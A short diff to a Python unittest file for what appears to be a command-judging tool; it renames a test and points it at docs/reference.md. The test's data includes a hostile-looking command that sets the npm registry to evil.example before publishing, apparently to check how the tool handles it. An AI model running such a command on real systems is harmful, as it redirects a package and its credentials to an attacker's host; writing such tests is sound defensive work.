@@ -118,12 +118,12 @@ class CasesAndSlashes(unittest.TestCase):
 
 
 class StateSetEarlier(unittest.TestCase):
-    def test_an_entry_sees_one_command_and_the_readme_says_so(self):
+    def test_an_entry_sees_one_command_and_the_reference_says_so(self):
         # Pinned, not fixed: the words of one command are what an entry
-        # matches (README, "What is never left out").
+        # matches (docs/reference.md, "What is never left out").
         self.assertTrue(hidden(PUBLISH, judged(
             "export npm_config_registry=http://evil.example; npm publish", MYLIB)))
-        with open(os.path.join(os.path.dirname(TESTS), "README.md"),
+        with open(os.path.join(os.path.dirname(TESTS), "docs", "reference.md"),
                   encoding="utf-8") as f:
             self.assertIn("by its id than by a pattern", f.read())
 
